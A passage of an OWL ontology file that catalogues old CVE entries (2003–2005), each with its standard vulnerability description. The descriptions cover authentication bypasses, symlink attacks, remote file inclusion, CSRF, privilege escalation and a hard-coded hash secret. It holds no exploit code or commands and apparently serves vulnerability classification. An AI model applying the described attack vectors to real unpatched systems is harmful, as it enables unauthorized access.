        rdfs:comment "tcptraceroute 1.4 and earlier does not fully drop privileges after obtaining a file descriptor for capturing packets, which may allow local users to gain access to the descriptor via a separate vulnerability in tcptraceroute."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2003-0501

    Annotations: 
        rdfs:comment "The /proc filesystem in Linux allows local users to obtain sensitive information by opening various entries in /proc/self before executing a setuid program, which causes the program to fail to change the ownership and permissions of those entries."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2003-0517

    Annotations: 
        rdfs:comment "faxrunqd.in in mgetty 1.1.28 and earlier allows local users to overwrite files via a symlink attack on JOB files."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2003-0578

    Annotations: 
        rdfs:comment "cci_dir in IBM U2 UniVerse 10.0.0.9 and earlier creates hard links and unlinks files as root, which allows local users to gain privileges by deleting and overwriting arbitrary files."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2003-0637

    Annotations: 
        rdfs:comment "Novell iChain 2.2 before Support Pack 1 uses a shorter timeout for a non-existent user than a valid user, which makes it easier for remote attackers to guess usernames and conduct brute force password guessing."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2003-0640

    Annotations: 
        rdfs:comment "BEA WebLogic Server and Express, when using NodeManager to start servers, provides Operator users with privileges to overwrite usernames and passwords, which may allow Operators to gain Admin privileges."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2003-0740

    Annotations: 
        rdfs:comment "Stunnel 4.00, and 3.24 and earlier, leaks a privileged file descriptor returned by listen(), which allows local users to hijack the Stunnel server."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2003-0750

    Annotations: 
        rdfs:comment "secure.php in PY-Membres 4.2 and earlier allows remote attackers to bypass authentication by setting the adminpy parameter."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2003-0754

    Annotations: 
        rdfs:comment "nphpd.php in newsPHP 216 and earlier allows remote attackers to bypass authentication via an HTTP request with a modified nphp_users array, which is used for authentication."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2003-0777

    Annotations: 
        rdfs:comment "saned in sane-backends 1.0.7 and earlier, when debug messages are enabled, does not properly handle dropped connections, which can prevent strings from being null terminated and cause a denial of service (segmentation fault)."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2003-0791

    Annotations: 
        rdfs:comment "The Script.prototype.freeze/thaw functionality in Mozilla 1.4 and earlier allows attackers to execute native methods by modifying the string used as input to the script.thaw JavaScript function, which is then deserialized and executed."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2003-0844

    Annotations: 
        rdfs:comment "mod_gzip 1.3.26.1a and earlier, and possibly later official versions, when running in debug mode without the Apache log, allows local users to overwrite arbitrary files via (1) a symlink attack on predictable temporary filenames on Unix systems, or (2) an NTFS hard link on Windows systems when the \"Strengthen default permissions of internal system objects\" policy is not enabled."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2003-0876

    Annotations: 
        rdfs:comment "Finder in Mac OS X 10.2.8 and earlier sets global read/write/execute permissions on directories when they are dragged (copied) from a mounted volume such as a disk image (DMG), which could cause the directories to have less restrictive permissions than intended."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2003-0907

    Annotations: 
        rdfs:comment "Help and Support Center in Microsoft Windows XP SP1 does not properly validate HCP URLs, which allows remote attackers to execute arbitrary code via quotation marks in an hcp:// URL, which are not quoted when constructing the argument list to HelpCtr.exe."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2003-0937

    Annotations: 
        rdfs:comment "SCO UnixWare 7.1.1, 7.1.3, and Open UNIX 8.0.0 allows local users to bypass protections for the \"as\" address space file for a process ID (PID) by obtaining a procfs file descriptor for the file and calling execve() on a setuid or setgid program, which leaves the descriptor open to the user."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2003-0981

    Annotations: 
        rdfs:comment "FreeScripts VisitorBook LE (visitorbook.pl) logs the reverse DNS name of a visiting host, which allows remote attackers to spoof the origin of their incoming requests and facilitate cross-site scripting (XSS) attacks."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2003-1026

    Annotations: 
        rdfs:comment "Internet Explorer 5.01 through 6 SP1 allows remote attackers to bypass zone restrictions via a javascript protocol URL in a sub-frame, which is added to the history list and executed in the top window's zone when the history.back (back) function is called, as demonstrated by BackToFramedJpu, aka the \"Travel Log Cross Domain Vulnerability.\""^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2003-1035

    Annotations: 
        rdfs:comment "The default installation of SAP R/3 46C/D allows remote attackers to bypass account locking by using the RFC API instead of the SAPGUI to conduct a brute force password guessing attack, which does not lock out the account like the SAPGUI does."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2003-1229

    Annotations: 
        rdfs:comment "X509TrustManager in (1) Java Secure Socket Extension (JSSE) in SDK and JRE 1.4.0 through 1.4.0_01, (2) JSSE before 1.0.3, (3) Java Plug-in SDK and JRE 1.3.0 through 1.4.1, and (4) Java Web Start 1.0 through 1.2 incorrectly calls the isClientTrusted method when determining server trust, which results in improper validation of digital certificate and allows remote attackers to (1) falsely authenticate peers for SSL or (2) incorrectly validate signed JAR files."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2003-1230

    Annotations: 
        rdfs:comment "The implementation of SYN cookies (syncookies) in FreeBSD 4.5 through 5.0-RELEASE-p3 uses only 32-bit internal keys when generating syncookies, which makes it easier for remote attackers to conduct brute force ISN guessing attacks and spoof legitimate traffic."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2003-1233

    Annotations: 
        rdfs:comment "Pedestal Software Integrity Protection Driver (IPD) 1.3 and earlier allows privileged attackers, such as rootkits, to bypass file access restrictions to the Windows kernel by using the NtCreateSymbolicLinkObject function to create a symbolic link to (1) \\Device\\PhysicalMemory or (2) to a drive letter using the subst command."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2003-1566

    Annotations: 
        rdfs:comment "Microsoft Internet Information Services (IIS) 5.0 does not log requests that use the TRACK method, which allows remote attackers to obtain sensitive information without detection."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2004-0030

    Annotations: 
        rdfs:comment "PHP remote file inclusion vulnerability in (1) functions.php, (2) authentication_index.php, and (3) config_gedcom.php for PHPGEDVIEW 2.61 allows remote attackers to execute arbitrary PHP code by modifying the PGV_BASE_DIRECTORY parameter to reference a URL on a remote web server that contains the code."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2004-0063

    Annotations: 
        rdfs:comment "The SPP_VerifyPVV function in nCipher payShield SPP library 1.3.12, 1.5.18 and 1.6.18 returns a Status_OK value even if the HSM returns a different status code, which could cause applications to make incorrect security-critical decisions, e.g. by accepting an invalid PIN number."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2004-0068

    Annotations: 
        rdfs:comment "PHP remote file inclusion vulnerability in config.php for PhpDig 1.6.5 and earlier allows remote attackers to execute arbitrary PHP code by modifying the $relative_script_path parameter to reference a URL on a remote web server that contains the code."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2004-0121

    Annotations: 
        rdfs:comment "Argument injection vulnerability in Microsoft Outlook 2002 does not sufficiently filter parameters of mailto: URLs when using them as arguments when calling OUTLOOK.EXE, which allows remote attackers to use script code in the Local Machine zone and execute arbitrary programs."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2004-0127

    Annotations: 
        rdfs:comment "Directory traversal vulnerability in editconfig_gedcom.php for phpGedView 2.65.1 and earlier allows remote attackers to read arbitrary files or execute arbitrary PHP programs on the server via .. (dot dot) sequences in the gedcom_config parameter."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2004-0128

    Annotations: 
        rdfs:comment "PHP remote file inclusion vulnerability in the GEDCOM configuration script for phpGedView 2.65.1 and earlier allows remote attackers to execute arbitrary PHP code by modifying the PGV_BASE_DIRECTORY parameter to reference a URL on a remote web server that contains a malicious theme.php script."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2004-0148

    Annotations: 
        rdfs:comment "wu-ftpd 2.6.2 and earlier, with the restricted-gid option enabled, allows local users to bypass access restrictions by changing the permissions to prevent access to their home directory, which causes wu-ftpd to use the root directory instead."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2004-0213

    Annotations: 
        rdfs:comment "Utility Manager in Windows 2000 launches winhlp32.exe while Utility Manager is running with raised privileges, which allows local users to gain system privileges via a \"Shatter\" style attack that sends a Windows message to cause Utility Manager to launch winhlp32 by directly accessing the context sensitive help and bypassing the GUI, then sending another message to winhlp32 in order to open a user-selected file, a different vulnerability than CVE-2003-0908."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2004-0217

    Annotations: 
        rdfs:comment "The LiveUpdate capability (liveupdate.sh) in Symantec AntiVirus Scan Engine 4.0 and 4.3 for Red Hat Linux allows local users to create or append to arbitrary files via a symlink attack on /tmp/LiveUpdate.log."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2004-0230

    Annotations: 
        rdfs:comment "TCP, when using a large Window Size, makes it easier for remote attackers to guess sequence numbers and cause a denial of service (connection loss) to persistent TCP connections by repeatedly injecting a TCP RST packet, especially in protocols that use long-lived connections, such as BGP."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2004-0261

    Annotations: 
        rdfs:comment "oj.cgi in OpenJournal 2.0 through 2.0.5 allows remote attackers to bypass authentication and access the control panel via a 0 in the uid parameter."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2004-0274

    Annotations: 
        rdfs:comment "Share.mod in Eggheads Eggdrop IRC bot 1.6.10 through 1.6.15 can mistakenly assign STAT_OFFERED status to a bot that is not a sharebot, which allows remote attackers to use STAT_OFFERED to promote a bot to a sharebot and conduct unauthorized activities."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2004-0285

    Annotations: 
        rdfs:comment "PHP remote file inclusion vulnerabilities in include/footer.inc.php in (1) AllMyVisitors, (2) AllMyLinks, and (3) AllMyGuests allow remote attackers to execute arbitrary PHP code via a URL in the _AMVconfig[cfg_serverpath] parameter."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2004-0366

    Annotations: 
        rdfs:comment "SQL injection vulnerability in the libpam-pgsql library before 0.5.2 allows attackers to execute arbitrary SQL statements."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2004-0380

    Annotations: 
        rdfs:comment "The MHTML protocol handler in Microsoft Outlook Express 5.5 SP2 through Outlook Express 6 SP1 allows remote attackers to bypass domain restrictions and execute arbitrary code, as demonstrated on Internet Explorer using script in a compiled help (CHM) file that references the InfoTech Storage (ITS) protocol handlers such as (1) ms-its, (2) ms-itss, (3) its, or (4) mk:@MSITStore, aka the \"MHTML URL Processing Vulnerability.\""^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2004-0411

    Annotations: 
        rdfs:comment "The URI handlers in Konqueror for KDE 3.2.2 and earlier do not properly filter \"-\" characters that begin a hostname in a (1) telnet, (2) rlogin, (3) ssh, or (4) mailto URI, which allows remote attackers to manipulate the options that are passed to the associated programs, possibly to read arbitrary files or execute arbitrary code."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2004-0473

    Annotations: 
        rdfs:comment "Argument injection vulnerability in Opera before 7.50 does not properly filter \"-\" characters that begin a hostname in a telnet URI, which allows remote attackers to insert options to the resulting command line and overwrite arbitrary files via (1) the \"-f\" option on Windows XP or (2) the \"-n\" option on Linux."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2004-0480

    Annotations: 
        rdfs:comment "Argument injection vulnerability in IBM Lotus Notes 6.0.3 and 6.5 allows remote attackers to execute arbitrary code via a notes: URI that uses a UNC network share pathname to provide an alternate notes.ini configuration file to notes.exe."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2004-0489

    Annotations: 
        rdfs:comment "Argument injection vulnerability in the SSH URI handler for Safari on Mac OS 10.3.3 and earlier allows remote attackers to (1) execute arbitrary code via the ProxyCommand option or (2) conduct port forwarding via the -R option."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2004-0689

    Annotations: 
        rdfs:comment "KDE before 3.3.0 does not properly handle when certain symbolic links point to \"stale\" locations, which could allow local users to create or truncate arbitrary files."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2004-0806

    Annotations: 
        rdfs:comment "cdrecord in the cdrtools package before 2.01, when installed setuid root, does not properly drop privileges before executing a program specified in the RSH environment variable, which allows local users to gain privileges."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2004-0828

    Annotations: 
        rdfs:comment "The ctstrtcasd program in RSCT 2.3.0.0 and earlier on IBM AIX 5.2 and 5.3 does not properly drop privileges before executing the -f option, which allows local users to modify or create arbitrary files."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2004-0829

    Annotations: 
        rdfs:comment "smbd in Samba before 2.2.11 allows remote attackers to cause a denial of service (daemon crash) by sending a FindNextPrintChangeNotify request without a previous FindFirstPrintChangeNotify, as demonstrated by the SMB client in Windows XP SP2."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2004-0847

    Annotations: 
        rdfs:comment "The Microsoft .NET forms authentication capability for ASP.NET allows remote attackers to bypass authentication for .aspx files in restricted directories via a request containing a (1) \"\\\" (backslash) or (2) \"%5C\" (encoded backslash), aka \"Path Validation Vulnerability.\""^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2004-1033

    Annotations: 
        rdfs:comment "Fcron 2.0.1, 2.9.4, and possibly earlier versions leak file descriptors of open files, which allows local users to bypass access restrictions and read fcron.allow and fcron.deny via the EDITOR environment variable."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2004-1058

    Annotations: 
        rdfs:comment "Race condition in Linux kernel 2.6 allows local users to read the environment variables of another process that is still spawning via /proc/.../cmdline."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2004-1101

    Annotations: 
        rdfs:comment "mailpost.exe in MailPost 5.1.1sv, and possibly earlier versions, allows remote attackers to cause a denial of service (server crash), leak sensitive pathname information in the resulting error message, and execute a cross-site scripting (XSS) attack via an HTTP request that contains a / (backslash) and arbitrary webscript before the requested file, which leaks the pathname and does not quote the script in the resulting Visual Basic error message."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2004-1461

    Annotations: 
        rdfs:comment "Cisco Secure Access Control Server (ACS) 3.2(3) and earlier spawns a separate unauthenticated TCP connection on a random port when a user authenticates to the ACS GUI, which allows remote attackers to bypass authentication by connecting to that port from the same IP address."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2004-1513

    Annotations: 
        rdfs:comment "04WebServer 1.42 does not adequately filter data that is written to log files, which could allow remote attackers to inject carriage return characters into the log file and spoof log entries."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2004-1579

    Annotations: 
        rdfs:comment "index.php in CubeCart 2.0.1 allows remote attackers to gain sensitive information via an HTTP request with an invalid cat_id parameter, which reveals the full path in a PHP error message."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2004-1581

    Annotations: 
        rdfs:comment "BlackBoard 1.5.1 allows remote attackers to gain sensitive information via a direct request to (1) checkdb.inc.php, (2) admin.inc.php or (3) cp.inc.php, which reveals the path in a PHP error message."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2004-1602

    Annotations: 
        rdfs:comment "ProFTPD 1.2.x, including 1.2.8 and 1.2.10, responds in a different amount of time when a given username exists, which allows remote attackers to identify valid usernames by timing the server response."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2004-1603

    Annotations: 
        rdfs:comment "cPanel 9.4.1-RELEASE-64 follows hard links, which allows local users to (1) read arbitrary files via the backup feature or (2) chown arbitrary files via the .htaccess file when Front Page extensions are enabled or disabled."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2004-1611

    Annotations: 
        rdfs:comment "SalesLogix 6.1 does not verify if a user is authenticated before performing sensitive operations, which could allow remote attackers to (1) execute arbitrary SLX commands on the server or spoof the server via a man-in-the-middle (MITM) attack, or (2) obtain the database password via a GetConnection request to TCP port 1707."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2004-1687

    Annotations: 
        rdfs:comment "CRLF injection vulnerability in down.asp for Snitz Forums 2000 3.4.04 allows remote attackers to perform HTTP Response Splitting attacks to modify expected HTML content from the server via the location parameter."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2004-1703

    Annotations: 
        rdfs:comment "Fusion News 3.6.1 allows remote attackers to add user accounts, if the administrator is logged in, via a comment that contains an img bbcode tag that calls index.php with the signup action, which is executed when the administrator's browser loads the page with the img tag."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2004-1714

    Annotations: 
        rdfs:comment "BlackICE PC Protection and Server Protection installs (1) firewall.ini, (2) blackice.ini, (3) sigs.ini and (4) protect.ini with Everyone Full Control permissions, which allows local users to cause a denial of service (crash) or modify configuration, as demonstrated by modifying firewall.ini to contain a large firewall rule."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2004-1842

    Annotations: 
        rdfs:comment "Cross-site request forgery (CSRF) vulnerability in Php-Nuke 6.x through 7.1.0 allows remote attackers to gain administrative privileges via an img tag with a URL to admin.php."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2004-1852

    Annotations: 
        rdfs:comment "DameWare Mini Remote Control 3.x before 3.74 and 4.x before 4.2 transmits the Blowfish encryption key in plaintext, which allows remote attackers to gain sensitive information."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2004-1901

    Annotations: 
        rdfs:comment "Portage before 2.0.50-r3 allows local users to overwrite arbitrary files via a hard link attack on the lockfiles."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2004-1948

    Annotations: 
        rdfs:comment "NcFTP client 3.1.6 and 3.1.7, when the username and password are included in an FTP URL that is provided on the command line, allows local users to obtain sensitive information via \"ps aux,\" which displays the URL in the process list."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2004-1967

    Annotations: 
        rdfs:comment "Cross-site request forgery (CSRF) vulnerabilities in (1) cp_forums.php, (2) cp_usergroup.php, (3) cp_ipbans.php, (4) myhome.php, (5) post.php, or (6) moderator.php in Open Bulletin Board (OpenBB) 1.0.6 and earlier allow remote attackers to execute arbitrary code by including the code in an image tag or a link."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2004-1995

    Annotations: 
        rdfs:comment "Cross-Site Request Forgery (CSRF) vulnerability in FuseTalk 2.0 allows remote attackers to create arbitrary accounts via a link to adduser.cfm."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2004-2012

    Annotations: 
        rdfs:comment "The systrace_exit function in the systrace utility for NetBSD-current and 2.0 before April 16, 2004, and certain FreeBSD ports, does not verify the owner of the /dec/systrace connection before setting euid to 0, which allows local users to gain root privileges."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2004-2061

    Annotations: 
        rdfs:comment "RiSearch 1.0.01 and RiSearch Pro 3.2.06 allows remote attackers to use the show.pl script as an open proxy, or read arbitrary local files, by setting the url parameter to a (1) http://, (2) ftp://, or (3) file:// URL."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2004-2070

    Annotations: 
        rdfs:comment "The Altiris Client Service for Windows 5.6 SP1 Hotfix E (5.6.181) allows local users to execute arbitrary commands by opening the AClient tray icon and using the View Log File option, a different vulnerability than CVE-2005-1590."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2004-2144

    Annotations: 
        rdfs:comment "Baal Smart Forms before 3.2 allows remote attackers to bypass authentication and obtain system access via a direct request to regadmin.php."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2004-2163

    Annotations: 
        rdfs:comment "login_radius on OpenBSD 3.2, 3.5, and possibly other versions does not verify the shared secret in a response packet from a RADIUS server, which allows remote attackers to bypass authentication by spoofing server replies."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2004-2164

    Annotations: 
        rdfs:comment "shoprestoreorder.asp in VP-ASP 5.0 does not close the database connection when a user restores a previous order, which allows remote attackers to cause a denial of service (connection consumption)."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2004-2172

    Annotations: 
        rdfs:comment "EarlyImpact ProductCart uses a weak encryption scheme to encrypt passwords, which allows remote attackers to obtain the password via a chosen plaintext attack."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2004-2204

    Annotations: 
        rdfs:comment "Macromedia ColdFusion MX 6.0 and 6.1 application server, when running with the CreateObject function or CFOBJECT tag enabled, allows local users to conduct unauthorized activities and obtain administrative passwords by creating CFML scripts that use CreateObject or CFOBJECT."^^xsd:string
    
    Types: 
        CVEEntries
    
    Facts:  
     categories_member  CWE-1011_Authorize_Actors
    
    
Individual: CVE-2004-2215

    Annotations: 
        rdfs:comment "RXVT-Unicode 3.4 and 3.5 does not properly close file descriptors, which allows local users to access the terminals of other users and possibly gain privileges."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2004-2257

    Annotations: 
        rdfs:comment "phpMyFAQ 1.4.0 allows remote attackers to access the Image Manager to upload or delete images without authorization via a direct request."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2004-2262

    Annotations: 
        rdfs:comment "ImageManager in e107 before 0.617 does not properly check the types of uploaded files, which allows remote attackers to execute arbitrary code by uploading a PHP file via the upload parameter to images.php."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2004-2397

    Annotations: 
        rdfs:comment "The web-based Management Console in Blue Coat Security Gateway OS 3.0 through 3.1.3.13 and 3.2.1, when importing a private key, stores the key and its passphrase in plaintext in a log file, which allows attackers to steal digital certificates."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2004-2504

    Annotations: 
        rdfs:comment "The GUI in Alt-N Technologies MDaemon 7.2 and earlier, including 6.8, executes child processes such as NOTEPAD.EXE with SYSTEM privileges when users create new files, which allows local users with physical access to gain privileges."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-0039

    Annotations: 
        rdfs:comment "Certain configurations of IPsec, when using Encapsulating Security Payload (ESP) in tunnel mode, integrity protection at a higher layer, or Authentication Header (AH), allow remote attackers to decrypt IPSec communications by modifying the outer packet in ways that cause plaintext data from the inner packet to be returned in ICMP messages, as demonstrated using bit-flipping attacks and (1) Destination Address Rewriting, (2) a modified header length that causes portions of the packet to be interpreted as IP Options, or (3) a modified protocol field and source address."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-0254

    Annotations: 
        rdfs:comment "BibORB 1.3.2, and possibly earlier versions, does not properly enforce a restriction for uploading only PDF and PS files, which allows remote attackers to upload arbitrary files that are presented to other users with PDF or PS icons, which may trick some users into downloading and executing those files."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-0315

    Annotations: 
        rdfs:comment "The FTP service in Magic Winmail Server 4.0 Build 1112 does not verify that the IP address in a PORT command is the same as the IP address of the user of the FTP session, which allows remote authenticated users to use the server as an intermediary for port scanning."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-0406

    Annotations: 
        rdfs:comment "A design flaw in image processing software that modifies JPEG images might not modify the original EXIF thumbnail, which could lead to an information leak of potentially sensitive visual information that had been removed from the main JPEG image."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-0408

    Annotations: 
        rdfs:comment "CitrusDB 0.3.6 and earlier generates easily predictable MD5 hashes of the user name for the id_hash cookie, which allows remote attackers to bypass authentication and gain privileges by calculating the MD5 checksum of the user name combined with the \"boogaadeeboo\" string, which is hard-coded in the $hidden_hash variable."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-0433

    Annotations: 
        rdfs:comment "Php-Nuke 7.5 allows remote attackers to determine the full path of the web server via invalid or missing arguments to (1) db.php, (2) mainfile.php, (3) Downloads/index.php, or (4) Web_Links/index.php, which lists the path in a PHP error message."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-0443

    Annotations: 
        rdfs:comment "index.php in CubeCart 2.0.4 allows remote attackers to (1) obtain the full path for the web server or (2) conduct cross-site scripting (XSS) attacks via an invalid language parameter, which echoes the parameter in a PHP error message."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-0459

    Annotations: 
        rdfs:comment "phpMyAdmin 2.6.2-dev, and possibly earlier versions, allows remote attackers to determine the full path of the web root via a direct request to select_lang.lib.php, which reveals the path in a PHP error message."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-0496

    Annotations: 
        rdfs:comment "Arkeia Network Backup Client 5.x contains hard-coded credentials that effectively serve as a back door, which allows remote attackers to access the file system and possibly execute arbitrary commands."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-0587

    Annotations: 
        rdfs:comment "Firefox before 1.0.1 and Mozilla before 1.7.6 allows remote malicious web sites to overwrite arbitrary files by tricking the user into downloading a .LNK (link) file twice, which overwrites the file that was referenced in the first .LNK file."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-0603

    Annotations: 
        rdfs:comment "viewtopic.php in phpBB 2.0.12 and earlier allows remote attackers to obtain sensitive information via a highlight parameter containing invalid regular expression syntax, which reveals the path in a PHP error message."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-0824

    Annotations: 
        rdfs:comment "The internal_dump function in Mathopd before 1.5p5, and 1.6x before 1.6b6 BETA, when Mathopd is running with the -n option, allows local users to overwrite arbitrary files via a symlink attack on dump files that are triggered by a SIGWINCH signal."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-0877

    Annotations: 
        rdfs:comment "Dnsmasq before 2.21 allows remote attackers to poison the DNS cache via answers to queries that were not made by Dnsmasq."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-0918

    Annotations: 
        rdfs:comment "The NPSVG3.dll ActiveX control for Adobe SVG Viewer 3.02 and earlier, when running on Internet Explorer, allows remote attackers to determine the existence of arbitrary files by setting the src property to the target filename and using Javascript to determine if the web page immediately stops loading, which indicates whether the file exists or not."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-1064

    Annotations: 
        rdfs:comment "The copy_symlink function in rsnapshot 1.2.0 and 1.1.x before 1.1.7 changes the ownership of files that a symlink points to rather than the symlink itself, which allows local users to obtain access to arbitrary files."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-1111

    Annotations: 
        rdfs:comment "Race condition in cpio 2.6 and earlier allows local users to modify permissions of arbitrary files via a hard link attack on a file while it is being decompressed, whose permissions are changed by cpio after the decompression is complete."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-1306

    Annotations: 
        rdfs:comment "The Adobe Reader control in Adobe Reader and Acrobat 7.0 and 7.0.1 allows remote attackers to determine the existence of files via Javascript containing XML script, aka the \"XML External Entity vulnerability.\""^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-1387

    Annotations: 
        rdfs:comment "Cocktail 3.5.4 and possibly earlier in Mac OS X passes the administrative password on the command line to sudo in cleartext, which allows local users to gain sensitive information by running listing processes."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-1527

    Annotations: 
        rdfs:comment "Eval injection vulnerability in awstats.pl in AWStats 6.4 and earlier, when a URLPlugin is enabled, allows remote attackers to execute arbitrary Perl code via the HTTP Referrer, which is used in a $url parameter that is inserted into an eval function call."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-1636

    Annotations: 
        rdfs:comment "mysql_install_db in MySQL 4.1.x before 4.1.12 and 5.x up to 5.0.4 creates the mysql_install_db.X file with a predictable filename and insecure permissions, which allows local users to execute arbitrary SQL commands by modifying the file's contents."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-1641

    Annotations: 
        rdfs:comment "mod_channel in The Ignition Project ignitionServer 0.3.0 to 0.3.6, and possibly earlier versions, does not allow protected operators to access channels that have been locked out by a key, which allows IRC users to cause a denial of service."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-1645

    Annotations: 
        rdfs:comment "Keyvan1 ImageGallery stores the image.mdb database under the web document root with insufficient access control, which allows remote attackers to obtain sensitive information."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-1652

    Annotations: 
        rdfs:comment "message.htm for Woppoware PostMaster 4.2.2 (build 3.2.5) allows remote attackers to bypass authentication by modifying the email parameter."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-1654

    Annotations: 
        rdfs:comment "Hosting Controller 6.1 Hotfix 1.9 and earlier allows remote attackers to register arbitrary users via a direct request to addsubsite.asp with the loginname and password parameters set."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-1668

    Annotations: 
